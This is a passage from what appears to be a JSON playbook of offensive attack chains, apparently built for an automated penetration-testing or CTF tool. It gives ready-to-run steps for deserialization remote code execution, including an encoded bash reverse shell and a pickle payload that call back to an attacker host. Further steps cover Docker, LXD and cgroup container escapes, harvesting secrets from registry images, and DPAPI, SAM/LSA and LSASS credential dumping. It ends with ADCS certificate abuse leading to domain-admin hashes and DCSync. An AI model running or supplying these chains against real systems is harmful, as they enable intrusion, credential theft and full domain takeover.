      ],
      "steps": [
        {
          "id": "identify_format",
          "name": "Identify the serialization format",
          "inline_command": "echo 'Look at intercepted requests/cookies. Common markers:\n  Java:    rO0AB / `\\xac\\xed` magic\n  Python:  base64 starting with `gASV` (pickle) or yaml.load() params\n  .NET:    AAEAAAD / base64 `BinaryFormatter`\n  PHP:     `O:<n>:\"ClassName\":<n>:{...}` serialize() format\n  Ruby:    `\\x04\\x08` Marshal magic'"
        },
        {
          "id": "java_ysoserial",
          "name": "Java — ysoserial gadget",
          "inline_command": "# Pick a gadget chain matching the app's classpath. CommonsCollections1\n# / 5 / 6 / 7 are usually winners on legacy Spring/Struts. Generate:\njava -jar ysoserial.jar CommonsCollections6 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}' > payload.bin\n# Deliver (cookie, body, header — wherever the deserialization happens):\ncurl -X POST '<url>' --data-binary @payload.bin -H 'Content-Type: application/x-java-serialized-object'\n",
          "inputs": {
            "url": "${target_url}"
          },
          "notes": "For Spring/SpEL bugs (CVE-2022-22963 / 22965), use the dedicated\nSpringShell payload. For Apache Commons Text (CVE-2022-42889), the\n\"Text4Shell\" prefix `${script:javascript:...}` lands in any logged\nstring.\n"
        },
        {
          "id": "python_pickle",
          "name": "Python — pickle RCE",
          "inline_command": "python3 -c '\nimport pickle, base64\nclass P:\n    def __reduce__(self):\n        return (__import__(\"os\").system, (\"bash -c \\\"bash -i >& /dev/tcp/<lhost>/<lport> 0>&1\\\"\",))\nprint(base64.b64encode(pickle.dumps(P())).decode())'\n# Send the base64 to the endpoint that pickle.loads() it.\n",
          "inputs": {
            "lhost": "${attacker_ip}",
            "lport": "4444"
          },
          "notes": "Common contexts: Celery task queues, Flask sessions when\nSECRET_KEY is known/leaked, YAML loaders using yaml.load (vs\nyaml.safe_load).\n"
        },
        {
          "id": "dotnet_ysoserial",
          "name": ".NET — ysoserial.net",
          "inline_command": "ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c \"calc.exe\" -o base64\n# Common gadgets: ObjectDataProvider, TypeConfuseDelegate, ActivitySurrogateSelector.\n# Common formatters: BinaryFormatter, NetDataContractSerializer, ObjectStateFormatter (Viewstate!).\n"
        },
        {
          "id": "php_phpggc",
          "name": "PHP — phpggc",
          "inline_command": "phpggc Symfony/RCE4 system 'id' -b\n# Output is base64-encoded serialized payload. Inject where the app\n# unserializes — cookies, URL params, POST bodies, X-Forwarded-For\n# headers used by app routers, etc.\n"
        },
        {
          "id": "confirm_rce",
          "name": "Catch the reverse shell",
          "inline_command": "nc -lvnp <lport>",
          "inputs": {
            "lport": "4444"
          }
        }
      ],
      "references": [
        {
          "title": "ysoserial (Java)",
          "url": "https://github.com/frohoff/ysoserial"
        },
        {
          "title": "ysoserial.net",
          "url": "https://github.com/pwntester/ysoserial.net"
        },
        {
          "title": "phpggc",
          "url": "https://github.com/ambionics/phpggc"
        },
        {
          "title": "HackTricks — Deserialization",
          "url": "https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html"
        }
      ],
      "next_chains": [
        {
          "chain": "shell-stabilization",
          "when": "reverse shell received",
          "reason": "Stabilize."
        },
        {
          "chain": "linux-priv-esc-recon",
          "when": "shell on Linux app server",
          "reason": "Escalate."
        },
        {
          "chain": "windows-priv-esc-recon",
          "when": "shell on Windows IIS / Tomcat",
          "reason": "AppPool → SeImpersonate path."
        }
      ]
    },
    {
      "id": "docker-breakout",
      "name": "Linux PE — Docker/LXD container & group breakout",
      "description": "Being in the `docker` group is equivalent to root. Same for `lxd`. Once inside a container with privileged or shared-fs mounts, the host is one command away. This chain covers the three most common patterns.\n",
      "tags": [
        "linux",
        "priv-esc",
        "docker",
        "lxd",
        "container-breakout"
      ],
      "difficulty": "easy",
      "inputs": [],
      "steps": [
        {
          "id": "check_groups",
          "name": "Check group membership",
          "inline_command": "id; groups",
          "notes": "`docker` or `lxd` group → instant root (steps below).\nNo group? Skip to step 5 (escape from inside the container).\n"
        },
        {
          "id": "docker_group_breakout",
          "name": "User in `docker` group → root on host",
          "inline_command": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
          "notes": "Mount the host root filesystem inside an alpine container, chroot\ninto it → root on the host. Works on any host where the user can\nreach the docker daemon.\n"
        },
        {
          "id": "lxd_breakout",
          "name": "User in `lxd` group → root on host",
          "inline_command": "# 1) Get a minimal Alpine image:\nwget https://github.com/saghul/lxd-alpine-builder/releases/latest/download/alpine-v3.18-x86_64.tar.gz -O /tmp/alpine.tar.gz\nlxc image import /tmp/alpine.tar.gz --alias alpine\nlxc init alpine pwned -c security.privileged=true\nlxc config device add pwned host disk source=/ path=/mnt/host recursive=true\nlxc start pwned\nlxc exec pwned -- chroot /mnt/host sh\n"
        },
        {
          "id": "container_capabilities",
          "name": "Inside a container — check capabilities & mounts",
          "inline_command": "capsh --print 2>/dev/null; mount | grep -E 'cgroup|docker|proc'",
          "notes": "cap_sys_admin present → many escapes possible (release_agent trick).\n`/proc` from host mounted → write to /proc/sys/kernel/core_pattern.\nDocker socket mounted (`/var/run/docker.sock`) → call back to the\ndaemon, run a new container with `-v /:/mnt`.\n"
        },
        {
          "id": "privileged_breakout",
          "name": "Privileged container → release_agent trick",
          "inline_command": "mkdir -p /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp\nmkdir /tmp/cgrp/x\necho 1 > /tmp/cgrp/x/notify_on_release\nhost_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)\necho \"$host_path/cmd\" > /tmp/cgrp/release_agent\nprintf '#!/bin/sh\\nps > /output' > /cmd\nchmod a+x /cmd\nsh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\"\n",
          "notes": "Classic privileged-container escape. `/output` ends up on the host.\n"
        }
      ],
      "references": [
        {
          "title": "Docker group → root",
          "url": "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#docker-group"
        },
        {
          "title": "LXD breakout",
          "url": "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#lxd-group"
        },
        {
          "title": "Container escape patterns",
          "url": "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/index.html"
        }
      ],
      "next_chains": [
        {
          "chain": "shell-stabilization",
          "reason": "Host shells almost always need a TTY upgrade."
        }
      ]
    },
    {
      "id": "docker-registry-pillage",
      "name": "Cloud / supply-chain — Docker registry pillage",
      "description": "Container registries (private Docker Hub, ECR, GCR, ACR, internal Harbor / Nexus) routinely hold images baked with hardcoded credentials, cloud keys, internal source code, and forgotten kubeconfigs. With registry creds (or sometimes anonymous access) → loot every layer.\n",
      "tags": [
        "cloud",
        "docker",
        "registry",
        "supply-chain",
        "post-exploitation"
      ],
      "difficulty": "easy",
      "inputs": [
        {
          "name": "registry",
          "description": "Registry hostname (registry-1.docker.io, docker.pkg.github.com, ghcr.io, <org>.dkr.ecr.<region>.amazonaws.com).",
          "required": true
        },
        {
          "name": "image_name",
          "description": "Image to start with (e.g. myorg/internal-api). Find more with the catalog API."
        }
      ],
      "steps": [
        {
          "id": "enumerate_catalog",
          "name": "Enumerate the catalog (private registries)",
          "inline_command": "# Docker Registry HTTP API v2:\ncurl -u <user>:<password> https://<registry>/v2/_catalog\n# ECR (need AWS creds — see aws-imds-ssrf chain):\naws ecr describe-repositories --region <region>\n# GHCR:\ngh api /user/packages?package_type=container\n",
          "inputs": {
            "registry": "${registry}"
          }
        },
        {
          "id": "list_tags",
          "name": "List tags for the target image",
          "inline_command": "curl -u <user>:<password> 'https://<registry>/v2/<image>/tags/list'\n",
          "inputs": {
            "registry": "${registry}",
            "image": "${image_name}"
          },
          "notes": "Look for tags like `latest`, `dev`, `staging`, `prod`, `v1.0.0`, and\nnumbered tags like `:1234` (CI build numbers — these often leak more\nsince they include build metadata layers).\n"
        },
        {
          "id": "pull_image",
          "name": "Pull the image without running it",
          "inline_command": "docker login <registry>\ndocker pull <registry>/<image>:<tag>\n# Or skip docker entirely with skopeo:\nskopeo copy docker://<registry>/<image>:<tag> dir:/tmp/image\n",
          "inputs": {
            "registry": "${registry}",
            "image": "${image_name}"
          }
        },
        {
          "id": "inspect_history",
          "name": "Inspect image history (often contains plaintext secrets)",
          "inline_command": "docker history --no-trunc <registry>/<image>:<tag>\n# Look for layers like:\n#   ENV AWS_ACCESS_KEY_ID=AKIAxxxx\n#   ENV DATABASE_PASSWORD=xxxx\n#   COPY ./.env /app/  (then later RUN rm /app/.env — old layer still has it)\n",
          "inputs": {
            "registry": "${registry}",
            "image": "${image_name}"
          }
        },
        {
          "id": "extract_layers",
          "name": "Extract every layer's filesystem — grep for secrets",
          "inline_command": "mkdir /tmp/extracted\ncd /tmp/extracted\ndocker save <registry>/<image>:<tag> -o /tmp/img.tar\ntar xf /tmp/img.tar\nfor layer in */layer.tar; do\n  mkdir -p $(dirname $layer)/_\n  tar xf $layer -C $(dirname $layer)/_\ndone\n# Grep across all layers:\ngrep -r -E 'AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z\\-_]{35}|sk_live|password\\s*=\\s*[A-Za-z0-9]' --include='*' .\n# Find kubeconfigs, SSH keys, JWT secrets, .env files:\nfind . -name 'config*' -path '*kube*' -o -name 'id_rsa*' -o -name '.env*' -o -name 'secrets.yaml'\n",
          "inputs": {
            "registry": "${registry}",
            "image": "${image_name}"
          },
          "notes": "Tools that automate this: trufflehog, gitleaks, deepfence/SecretScanner,\nanchore/syft (for SBOM). Run all of them — each catches different\npatterns.\n"
        },
        {
          "id": "anonymous_pull_check",
          "name": "Some registries allow anonymous pull (try without creds)",
          "inline_command": "curl 'https://<registry>/v2/'\n# HTTP 200 → anonymous pull allowed\n# HTTP 401 → auth required; check WWW-Authenticate for the realm\ncurl 'https://<registry>/v2/<image>/manifests/latest'\n",
          "inputs": {
            "registry": "${registry}",
            "image": "${image_name}"
          },
          "notes": "Especially common with GitHub Container Registry (public packages),\ngcr.io public images, and mis-configured internal Harbor instances.\n"
        },
        {
          "id": "leverage_loot",
          "name": "Use the extracted secrets — cascade",
          "inline_command": "echo 'AWS keys → aws-imds-ssrf next chain (with stolen keys instead of IMDS).\\nKubeconfig → kubernetes-pod-escape.\\nSSH keys → straight to SSH; check known hosts for targets.'"
        }
      ],
      "references": [
        {
          "title": "Trufflehog (secret scanner)",
          "url": "https://github.com/trufflesecurity/trufflehog"
        },
        {
          "title": "Docker Registry HTTP API v2",
          "url": "https://distribution.github.io/distribution/spec/api/"
        }
      ],
      "next_chains": [
        {
          "chain": "kubernetes-pod-escape",
          "when": "kubeconfig extracted",
          "reason": "Now you can hit the cluster API directly."
        },
        {
          "chain": "aws-imds-ssrf",
          "when": "AWS keys extracted",
          "reason": "Skip the SSRF dance — already have creds for the API."
        }
      ]
    },
    {
      "id": "dpapi-secrets-extraction",
      "name": "Cred Access — DPAPI masterkey & blob extraction",
      "description": "Once you have local admin on a Windows host, DPAPI blobs decode every vault entry (RDP creds, Chrome cookies/passwords, scheduled-task secrets). The chain captures masterkeys + decrypts blobs without ever touching the user's plaintext password.\n",
      "tags": [
        "credential-access",
        "dpapi",
        "post-exploitation",
        "windows"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "target_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "user",
          "source": "target_context.user",
          "required": true
        },
        {
          "name": "password",
          "source": "target_context.password"
        }
      ],
      "steps": [
        {
          "id": "dpapi_remote",
          "name": "Remote DPAPI dump via NetExec",
          "command_ref": "nxc-dpapi-hash",
          "inputs": {
            "ip": "${target_ip}",
            "user": "${user}",
            "password": "${password}"
          },
          "notes": "Pulls credentials cached by every user that logged in. Watch for\n`LegacyGeneric:target=`, `Domain:target=`, and `MicrosoftAccount:`\nentries — those become PtH/PtT candidates for lateral movement.\n",
          "capture": [
            {
              "var": "dpapi_secrets",
              "regex": "\\[\\+\\]\\s+Decrypted secret:\\s*(.+)$",
              "match": "all"
            }
          ]
        },
        {
          "id": "lsa_secrets",
          "name": "Also grab SAM/LSA secrets",
          "command_ref": "nxc-smb-sam-lsa",
          "inputs": {
            "ip": "${target_ip}",
            "user": "${user}",
            "password": "${password}"
          },
          "capture": [
            {
              "var": "ntlm_hashes",
              "regex": "^([A-Za-z0-9._$-]+):(\\d+):([a-f0-9]{32}):([a-f0-9]{32}):::",
              "match": "all",
              "groups": {
                "user": 1,
                "rid": 2,
                "lm": 3,
                "nt": 4
              }
            }
          ]
        },
        {
          "id": "lsassy",
          "name": "Optionally also dump LSASS (in-memory creds)",
          "command_ref": "nxc-lsassy",
          "inputs": {
            "ip": "${target_ip}",
            "user": "${user}",
            "password": "${password}"
          },
          "notes": "Use only when you accept the EDR risk. Many CTF boxes don't have\nDefender enabled. Also try `--method nanodump` for stealthier dumps.\n"
        }
      ],
      "references": [
        {
          "title": "DPAPI internals",
          "url": "https://www.synacktiv.com/en/publications/operational-guidance-for-offensive-dpapi-abuse.html"
        },
        {
          "title": "HackTricks — DPAPI",
          "url": "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/dpapi-extracting-passwords.html"
        }
      ],
      "next_chains": [
        {
          "chain": "pth-lateral-spread",
          "when": "ntlm_hashes captured",
          "reason": "Cascading hashes → cascading lateral movement."
        },
        {
          "chain": "ad-persistence-golden-ticket",
          "when": "krbtgt hash captured",
          "reason": "krbtgt → Golden Ticket persistence."
        }
      ]
    },
    {
      "id": "esc1-adcs-takeover",
      "name": "ADCS ESC1 — request cert as anyone, become DA",
      "description": "Find a Certificate Template with ENROLLEE_SUPPLIES_SUBJECT enabled and enroll rights for low-priv users, then request a cert with the Administrator UPN in the SAN. Authenticate via PKINIT and recover the target user's NT hash.\n",
      "tags": [
        "adcs",
        "esc1",
        "priv-esc",
        "certificates",
        "active-directory"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "dc_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "domain",
          "source": "target_context.domain",
          "required": true
        },
        {
          "name": "user",
          "source": "target_context.user",
          "required": true
        },
        {
          "name": "password",
          "source": "target_context.password",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "find_templates",
          "name": "Enumerate the CA and vulnerable templates",
          "command_ref": "certipy-find",
          "inputs": {
            "ip": "${dc_ip}",
            "domain": "${domain}",
            "user": "${user}",
            "password": "${password}"
          },
          "notes": "Look at the report: any template marked `[!] Vulnerabilities: ESC1`\nwith `Enrollment Rights: Domain Users` (or your user's groups) is a\ngo. Record the template name and the issuing CA name.\n",
          "capture": [
            {
              "var": "vuln_template",
              "regex": "Template Name\\s*:\\s*(\\S+)\\s*\\n[\\s\\S]*?Vulnerabilities[\\s\\S]*?ESC1",
              "match": "first"
            },
            {
              "var": "ca_name",
              "regex": "\\[Certificate Authority\\][\\s\\S]*?CA Name\\s*:\\s*(.+?)$",
              "match": "first"
            }
          ]
        },
        {
          "id": "request_cert",
          "name": "Request cert with Administrator UPN in SAN",
          "command_ref": "certipy-esc1",
          "requires": [
            "vuln_template",
            "ca_name"
          ],
          "inputs": {
            "domain": "${domain}",
            "user": "${user}",
            "password": "${password}",
            "dc-ip": "${dc_ip}",
            "ca_name": "${ca_name}",
            "vulnerable_template": "${vuln_template}",
            "target_user": "administrator"
          },
          "capture": [
            {
              "var": "pfx_file",
              "regex": "Saved certificate and private key to '(.+?\\.pfx)'",
              "match": "first"
            }
          ]
        },
        {
          "id": "pkinit_auth",
          "name": "PKINIT auth with the cert → DA NT hash",
          "command_ref": "certipy-auth",
          "requires": [
            "pfx_file"
          ],
          "inputs": {
            "pfx_file": "${pfx_file}",
            "ip": "${dc_ip}"
          },
          "capture": [
            {
              "var": "dc_nt_hash",
              "regex": "(?:NT hash|Got hash for[^:]+):[^a-f0-9]*([a-f0-9]{32})",
              "match": "first"
            }
          ]
        },
        {
          "id": "dcsync",
          "name": "DCSync with the recovered DA hash",
          "command_ref": "secretsdump",
          "requires": [
            "dc_nt_hash"
          ],
          "notes": "Use the NTLM-hash variation of secretsdump. The recovered hash IS\nAdministrator's NT — at this point the domain is compromised.\n"
        }
      ],
      "references": [
        {
          "title": "Certified Pre-Owned (ADCS attacks)",
          "url": "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
        },
        {
          "title": "Certipy README",
          "url": "https://github.com/ly4k/Certipy"
        }
      ],
      "next_chains": [
        {
          "chain": "ad-persistence-golden-ticket",
          "when": "dc_nt_hash captured",
          "reason": "You hold the DA — forge golden tickets."
        },
        {
          "chain": "pth-lateral-spread",
          "when": "dc_nt_hash captured",
          "reason": "Use the DA NT hash to walk every server."
        }
      ]
    },
    {
      "id": "esc11-adcs-icpr-relay",
      "name": "ADCS ESC11 — relay over ICPR (RPC) without encryption",
      "description": "CA missing IF_ENFORCEENCRYPTICERTREQUEST. RPC cert-request channel accepts un-encrypted requests → relay coerced machine auth into a cert for the relayed identity. The MS-ICPR cousin of ESC8.\n",
      "tags": [
        "adcs",
        "esc11",
        "ntlm-relay",
        "coercion",
        "certificates"
      ],
      "difficulty": "hard",
      "inputs": [
        {
          "name": "dc_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "ca_ip",
          "description": "IP of the ADCS server.",
          "required": true
        },
        {
          "name": "listener_ip",
          "description": "Your attacker IP.",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "find_esc11",
          "name": "Confirm CA is ESC11 (un-encrypted ICPR)",
          "command_ref": "certipy-find",
          "inputs": {
            "ip": "${dc_ip}"
          },
          "notes": "Look at the CA section: `Enforce Encryption for Requests: False` →\nESC11 viable. Newer CAs default to True; older deployments and\npoorly managed CAs flip it for compatibility.\n"
        },
        {
          "id": "start_relay",
          "name": "Start certipy relay (ICPR target)",
          "command_ref": "certipy-esc11",
          "inputs": {
            "ip": "${ca_ip}"
          },
          "notes": "Run as: `certipy relay -target rpc://<ca_ip>` (the rpc:// scheme\nenables ICPR mode). Leave it running.\n"
        },
        {
          "id": "coerce_dc",
          "name": "Coerce DC machine auth to the relay",
          "command_ref": "coercer",
          "inputs": {
            "listener_ip": "${listener_ip}",
            "target_ip": "${dc_ip}"
          },
          "notes": "DC$ authenticates → certipy mints a cert FOR THE DC machine account\n(i.e. you get a cert you can authenticate as DC$).\n"
        },
        {
          "id": "capture_pfx",
          "name": "Pick up the PFX from certipy output",
          "inline_command": "# Look for: [+] Saved certificate and private key to '<dc>$.pfx'",
          "capture": [
            {
              "var": "dc_pfx",
              "regex": "Saved certificate and private key to '(\\S+\\$\\.pfx)'",
              "match": "first"
            }
          ]
        },
        {
          "id": "pkinit_auth",
          "name": "PKINIT as DC$ → NT hash of DC machine account",
          "command_ref": "certipy-auth",
          "requires": [
            "dc_pfx"
          ],
          "inputs": {
            "pfx_file": "${dc_pfx}",
            "ip": "${dc_ip}"
          },
          "capture": [
            {
              "var": "dc_machine_hash",
              "regex": "(?:NT hash|Got hash for[^:]+):[^a-f0-9]*([a-f0-9]{32})",
              "match": "first"
            }
          ]
        },
        {
          "id": "dcsync",
          "name": "DCSync as DC$ (machine accounts have replication rights)",
          "inline_command": "impacket-secretsdump -hashes ':<hash>' '<domain>/<DC_NAME>$@<dc-ip>' -just-dc",
          "inputs": {
            "hash": "${dc_machine_hash}",
            "dc-ip": "${dc_ip}"
          }
        }
      ],
      "references": [
        {
          "title": "Certipy ESC11 deep dive",
          "url": "https://research.ifcr.dk/relaying-to-ad-certificate-services-over-rpc-7211c45b35c0"
        }
      ],
      "next_chains": [
        {
          "chain": "ad-persistence-golden-ticket",
          "when": "krbtgt hash captured",
          "reason": "Persist via Golden Ticket."
        }
      ]
    },
    {
      "id": "esc13-adcs-issuance-policy",
      "name": "ADCS ESC13 — Issuance Policy OID linked to a group",
      "description": "A certificate Issuance Policy OID is linked (via msDS-OIDToGroupLink) to an AD group. Any cert issued under that policy gives the holder group membership at authentication time — including in privileged groups like Enterprise Admins.\n",
      "tags": [
        "adcs",
        "esc13",
        "priv-esc",
        "certificates",
        "oid-mapping"
      ],
      "difficulty": "hard",
      "inputs": [
        {
          "name": "dc_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "domain",
          "source": "target_context.domain",
          "required": true
        },
        {
          "name": "user",
          "source": "target_context.user",
          "required": true
        },
        {
          "name": "password",
          "source": "target_context.password",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "find_esc13",
          "name": "Find ESC13 templates (OID-linked policies)",
          "command_ref": "certipy-find",
          "inputs": {
            "ip": "${dc_ip}",
            "domain": "${domain}",
            "user": "${user}",
            "password": "${password}"
          },
          "notes": "certipy-find prints `[!] Vulnerabilities: ESC13` and shows the OID\n→ group mapping. Look for groups like \"Enterprise Admins\",\n\"Domain Admins\", \"Backup Operators\".\n",
          "capture": [
            {
              "var": "vuln_template",
              "regex": "Template Name\\s*:\\s*(\\S+)\\s*\\n[\\s\\S]*?Vulnerabilities[\\s\\S]*?ESC13",
              "match": "first"
            },
            {
              "var": "ca_name",
              "regex": "CA Name\\s*:\\s*(.+?)$",
              "match": "first"
            },
            {
              "var": "privileged_group",
              "regex": "Issuance Policies[\\s\\S]*?\\((CN=[^)]+)\\)",
              "match": "first"
            }
          ]
        },
        {
          "id": "request_cert",
          "name": "Request cert via the policy-linked template",
          "command_ref": "certipy-esc13",
          "requires": [
            "vuln_template",
            "ca_name"
          ],
          "inputs": {
            "domain": "${domain}",
            "user": "${user}",
            "password": "${password}",
            "dc-ip": "${dc_ip}",
            "ca_name": "${ca_name}",
            "vulnerable_template": "${vuln_template}"
          },
          "capture": [
            {
              "var": "pfx_file",
              "regex": "Saved certificate and private key to '(.+?\\.pfx)'",
              "match": "first"
            }
          ]
        },
        {
          "id": "pkinit_auth",
          "name": "Authenticate — KDC adds the linked group to your token",
          "command_ref": "certipy-auth",
          "requires": [
            "pfx_file"
          ],
          "inputs": {
            "pfx_file": "${pfx_file}",
            "ip": "${dc_ip}"
          },
          "notes": "`klist tickets` / `whoami /groups` after auth show the new group\nmembership. If the linked group was EA → you can now DCSync.\n"
        }
      ],
      "references": [
        {
          "title": "ESC13 (Jonas)",
          "url": "https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53"
        }
      ],
      "next_chains": [
        {
          "chain": "ad-persistence-golden-ticket",
          "when": "privileged group obtained",
          "reason": "Persist via Golden Ticket."
        },
        {
          "chain": "pth-lateral-spread",
          "when": "NTLM hashes captured via DCSync",
          "reason": "Spread the harvested hashes."
        }
      ]
    },
    {
      "id": "esc15-adcs-ekuwu",
      "name": "ADCS ESC15 — EKUwu (Application Policies in v1 schema)",
      "description": "CVE-2024-49019. v1 schema templates (which include `WebServer` by default) ignore the configured EKU when an Application Policy extension is provided in the request. Any v1-enrollable template becomes a path to client-auth (and impersonation via SAN) for low-priv users.\n",
      "tags": [
        "adcs",
        "esc15",
        "ekuwu",
        "cve-2024-49019",
        "priv-esc",
        "certificates"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "dc_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "domain",
          "source": "target_context.domain",
          "required": true
        },
        {
          "name": "user",
          "source": "target_context.user",
          "required": true
        },
        {
          "name": "password",
          "source": "target_context.password",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "find_esc15",
          "name": "Find ESC15 templates (v1 + Domain Users can enroll)",
          "command_ref": "certipy-find",
          "inputs": {
            "ip": "${dc_ip}",
            "domain": "${domain}",
            "user": "${user}",
            "password": "${password}"
          },
          "notes": "`WebServer` is the canonical example — present on most CAs by default,\nDomain Computers / Authenticated Users can enroll. certipy-find flags\nESC15 explicitly on v1 templates.\n",
          "capture": [
            {
              "var": "vuln_template",
              "regex": "Template Name\\s*:\\s*(\\S+)\\s*\\n[\\s\\S]*?Vulnerabilities[\\s\\S]*?ESC15",
              "match": "first"
            },
            {
              "var": "ca_name",
              "regex": "CA Name\\s*:\\s*(.+?)$",
              "match": "first"
            }
          ]
        },
        {
          "id": "request_with_app_policy",
          "name": "Request cert with Application Policy = Client Auth + SAN=admin",
          "command_ref": "certipy-esc15",
          "requires": [
            "vuln_template",
            "ca_name"
          ],
          "inputs": {
            "domain": "${domain}",
            "user": "${user}",
            "password": "${password}",
            "dc-ip": "${dc_ip}",
            "ca_name": "${ca_name}",
            "vulnerable_template": "${vuln_template}"
          },
          "notes": "Certipy automatically embeds the Application Policy extension. Without\npatch KB5044277 (Nov 2024) the CA honors it over the template EKU.\n",
          "capture": [
            {
              "var": "pfx_file",
              "regex": "Saved certificate and private key to '(.+?\\.pfx)'",
              "match": "first"
            }
          ]
        },
        {
          "id": "pkinit_auth",
          "name": "PKINIT auth → DA NT hash",
          "command_ref": "certipy-auth",
          "requires": [
            "pfx_file"
          ],
          "inputs": {
            "pfx_file": "${pfx_file}",
            "ip": "${dc_ip}"
          },
          "capture": [
            {
              "var": "dc_nt_hash",
              "regex": "(?:NT hash|Got hash for[^:]+):[^a-f0-9]*([a-f0-9]{32})",
              "match": "first"
            }
          ]
        }
      ],
      "references": [
        {
          "title": "EKUwu (TrustedSec)",
          "url": "https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc"
        },
        {
          "title": "CVE-2024-49019",
          "url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49019"
        }
      ],
      "next_chains": [
        {
          "chain": "ad-persistence-golden-ticket",
          "when": "dc_nt_hash captured",
          "reason": "Golden Ticket."
        }
      ]
    },
    {
      "id": "esc2-adcs-any-purpose",
      "name": "ADCS ESC2 — Any Purpose EKU template",
      "description": "Template with the `Any Purpose` EKU (OID 2.5.29.37.0) — when enrollable by low-priv, you can request a cert valid for client authentication AND enrollment agent → mint certs for anyone. Plus, you don't need SAN control (unlike ESC1).\n",
      "tags": [
        "adcs",
        "esc2",
        "priv-esc",
        "certificates",
        "active-directory"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "dc_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "domain",
          "source": "target_context.domain",
          "required": true
        },
        {
          "name": "user",
          "source": "target_context.user",
          "required": true
        },
        {
          "name": "password",
          "source": "target_context.password",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "find_esc2",
          "name": "Find templates flagged ESC2",
          "command_ref": "certipy-find",
          "inputs": {
            "ip": "${dc_ip}",
            "domain": "${domain}",
            "user": "${user}",
            "password": "${password}"
          },
          "notes": "Look for `[!] Vulnerabilities: ESC2` and your principal in\n`Enrollment Rights`. Record the template + CA name.\n",
          "capture": [
            {
              "var": "vuln_template",
              "regex": "Template Name\\s*:\\s*(\\S+)\\s*\\n[\\s\\S]*?Vulnerabilities[\\s\\S]*?ESC2",
              "match": "first"
            },
            {
              "var": "ca_name",
              "regex": "CA Name\\s*:\\s*(.+?)$",
              "match": "first"
            }
          ]
        },
        {
          "id": "request_anypurpose",
          "name": "Request cert via Any Purpose template",
          "command_ref": "certipy-esc2",
          "requires": [
            "vuln_template",
            "ca_name"
          ],
          "inputs": {
            "domain": "${domain}",
            "user": "${user}",
            "password": "${password}",
            "dc-ip": "${dc_ip}",
            "ca_name": "${ca_name}",
            "vulnerable_template": "${vuln_template}"
          },
          "capture": [
            {
              "var": "pfx_file",
              "regex": "Saved certificate and private key to '(.+?\\.pfx)'",
              "match": "first"
            }
          ]
        },
        {
          "id": "pkinit_auth",
          "name": "Authenticate with the cert",
          "command_ref": "certipy-auth",
          "requires": [
            "pfx_file"
          ],
          "inputs": {
            "pfx_file": "${pfx_file}",
            "ip": "${dc_ip}"
          },
          "capture": [
            {
              "var": "dc_nt_hash",
              "regex": "(?:NT hash|Got hash for[^:]+):[^a-f0-9]*([a-f0-9]{32})",
              "match": "first"
            }
          ]
        }
      ],
      "references": [
        {
          "title": "Certified Pre-Owned — ESC2",
          "url": "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
        }
      ],
      "next_chains": [
        {
          "chain": "ad-persistence-golden-ticket",
          "when": "dc_nt_hash captured",
          "reason": "Domain admin → Golden Ticket."
        },
        {
          "chain": "pth-lateral-spread",
          "when": "dc_nt_hash captured",
          "reason": "Spread the DA hash."
        }
      ]
    },
    {
      "id": "esc3-adcs-enrollment-agent",
      "name": "ADCS ESC3 — Enrollment Agent template chain",
      "description": "Template with Certificate Request Agent EKU lets you request a cert as ANYONE through a second template that allows enrollment-agent enrollment. Two-cert dance: get the agent cert first, then use it to mint the target cert.\n",
      "tags": [
        "adcs",
        "esc3",
        "priv-esc",
        "certificates",
        "enrollment-agent"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "dc_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "domain",
          "source": "target_context.domain",
          "required": true
        },
        {
          "name": "user",
          "source": "target_context.user",
          "required": true
        },
        {
          "name": "password",
          "source": "target_context.password",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "find_esc3",
          "name": "Find ESC3 template pair (agent + agent-enabled)",
          "command_ref": "certipy-find",
          "inputs": {
            "ip": "${dc_ip}",
            "domain": "${domain}",
            "user": "${user}",
            "password": "${password}"
          },
          "notes": "ESC3 needs TWO templates:\n 1. A template with EKU `Certificate Request Agent` (1.3.6.1.4.1.311.20.2.1)\n    AND your principal in Enrollment Rights.\n 2. A template that allows enrollment by the Enrollment Agent.\ncertipy-find prints both. Record each name.\n",
          "capture": [
            {
              "var": "agent_template",
              "regex": "Template Name\\s*:\\s*(\\S+)\\s*\\n[\\s\\S]*?Vulnerabilities[\\s\\S]*?ESC3",
              "match": "first"
            },
            {
              "var": "ca_name",
              "regex": "CA Name\\s*:\\s*(.+?)$",
              "match": "first"
            }
          ]
        },
        {
          "id": "get_agent_cert",
